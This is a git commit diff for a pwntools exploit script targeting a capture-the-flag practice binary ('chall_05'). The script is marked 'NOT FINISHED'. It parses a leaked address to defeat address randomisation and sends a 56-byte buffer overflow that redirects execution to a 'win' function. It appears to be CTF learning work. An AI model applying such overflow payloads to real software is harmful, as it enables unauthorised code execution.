8c7d09a1471e588f769c20f1e8c0b038c3f5a41e
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-05 20:39:01 -0400

    # NOT FINISHED

--- chall_05/05.py
+++ chall_05/05.py
@@ -1,10 +1,12 @@
 from pwn import *
-p = process("./chall_05")
 binary = context.binary = ELF('./chall_05')
-p.recv()
-leak = int(leak,16)
-binary.address = leak - binary.sym.main
+p = process(binary.path)
+p.recvuntil('I wonder what this is: ')
+_ = p.recvline().strip()
+stack = int(_,16)
+binary.address = stack - binary.sym.main
 p.sendline(56*b'A' + p64(binary.sym.win) + b'')
+p.interactive()
 
 # NOT FINISHED
 
